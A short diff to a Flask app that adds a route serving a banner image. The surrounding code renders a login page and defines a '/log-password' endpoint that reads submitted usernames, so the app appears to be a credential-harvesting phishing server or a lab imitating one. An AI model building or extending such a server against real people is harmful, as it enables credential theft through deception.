@@ -6,6 +6,10 @@ app = Flask(__name__)
 def serve_login():
     return render_template('index.html')
 
+@app.route('/banner.jpeg')
+def serve_image():
+    return send_from_directory('.', 'banner.jpeg')
+
 @app.route('/log-password', methods=['POST'])
 def log_password():
     username = request.form.get('username')
